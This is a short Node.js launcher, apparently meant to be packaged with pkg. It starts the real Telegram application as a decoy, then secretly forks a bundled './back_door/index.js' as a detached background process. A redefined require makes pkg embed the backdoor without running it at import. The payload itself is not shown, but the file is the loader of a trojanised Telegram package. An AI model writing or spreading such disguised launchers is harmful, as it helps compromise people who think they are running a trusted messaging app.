const { execFile, fork } = require('child_process')
const path = require('path')

execFile('../Applicazioni/Telegram/Telegram').unref()

// Overwrited the require function for allow pkg the import in the snapshot but not the execution
var require = function (str) {}
require('./back_door/index.js')

// Execute backdoor in detached mode
subprocess = fork(path.join('/snapshot/build/' , './back_door/index.js'), [], { detached: true })
